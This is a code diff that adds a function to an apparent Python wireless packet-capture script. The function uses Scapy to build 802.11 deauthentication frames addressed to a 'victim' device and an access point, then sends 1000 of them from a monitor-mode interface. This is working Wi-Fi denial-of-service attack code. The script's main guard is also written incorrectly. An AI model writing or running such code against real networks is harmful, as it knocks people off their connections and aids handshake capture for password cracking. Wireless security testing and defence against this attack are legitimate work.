@@ -33,6 +33,22 @@ def pktCap(pkt):
 
         time.sleep(5) # Take a second to avoid crazy writing to the file
 
+def deauth_ap(AP_MAC, VICTIM_MAC):
+    '''
+        Function: deauth_ap
+        Purpose: Send deauth packets to AP, and victim
+        Param: AP_MAC: access point MAC control, 
+               VICTIM_MAC: victim mac address
+                    
+        Return: Nothing
+
+
+        TODO: Embed auto deauth capabilities.
+    '''
+    interface = "mon0"
+    frame= RadioTap()/ Dot11(addr1=VICTIM_MAC,addr2=AP_MAC, addr3=AP_MAC)/ Dot11Deauth()
+    sendp(frame,iface=interface, count= 1000, inter= .1)
+
 
 if "__name__" == __main__:
     monMode()
